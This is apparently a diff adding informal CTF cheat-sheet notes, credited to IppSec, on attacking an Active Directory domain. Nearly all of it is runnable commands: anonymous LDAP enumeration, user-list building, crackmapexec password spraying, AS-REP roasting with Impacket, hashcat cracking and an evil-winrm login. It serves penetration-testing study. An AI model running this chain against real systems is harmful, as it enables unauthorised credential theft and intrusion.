@@ -1,0 +1,109 @@
+=====================================
+IppSec's LDAP Ninja S***
+=====================================
+#side not, I'm using 192.168.1.10 as a place holder for the actual target IP
+If your on HTB it will be a 10.10.10 IP, but I like the aesthetics of Class C network range.
+
+
+#forget enum4linux..it's ugly, use ldapsearch instead
+
+ldapsearch -h <targetIP>  -x
+
+ldapseach -h 192.168.1.10 -x -s base namingcontexts
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" > ldap-anonymous.out
+
+cat ldap-anonymous.out | grep -i memberof
+
+less ldap-anonymous.out
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName 
+
+------------------------------------------------------------------------------------------------------------
+Make a user list to use with password list so that you can crack passwords
+-------------------------------------------------------------------------------------------------------------
+# Behold the Power of AWK..
+
+ldapsearch -h 192.168.1.10 -x -b "DC=name,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap
+
+--------------------
+crackmap shit
+------------------
+
+crackmapexec smb 192.168.1.10 --pass-pol
+[*] wordshitthing
+
+null authentication sessions domain enumeration
+crackmapexec smb 192.168.1.10 -u '' -p ''
+
+crackmapexec smb 192.168.1.10 -u userlist.out -p pwlist.txt
+
+
+
+------------------------------------------------------------------------
+IMPACKET Python scripts!
+------------------------------------------------------------------------
+
+IMPACKET & hashcat S***
+
+./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/'
+
+
+./GetNPUsers.py -dc-ip 192.168.1.10 -request 'target.domain/' -format hashcat
+
+
+
+Crack the pw with Hashcat
+
+Kerberos
+
+./hashcat --example-hashes | grep -i krb
+
+asrep23
+
+create a text doc with the hash
+
+Vim hashes/svc-dude
+
+once you get the dudes pw do
+
+crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw
+
+should log in
+
+crackmapexec smb 192.168.1.10 -u svc-dude -p dudespw --shares
+
+get group policy pw if you can
+
+search the hashes file to get the mode number
+
+./hashcat --example-hashes | less
+
+mode 18200 for asrep
+
+hascat cmd
+
+hashcat -m 18200 hashse/svc-dude  /opt/wordlists/rockyou.txt -r rules/InsidePro-PasswordsPro.rule 
+
+
+-----------------------------------------------------
+
+winrm 
+
+./evil-winrm.rb -u svc-user -p hispassword -i 192.168.1.10
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
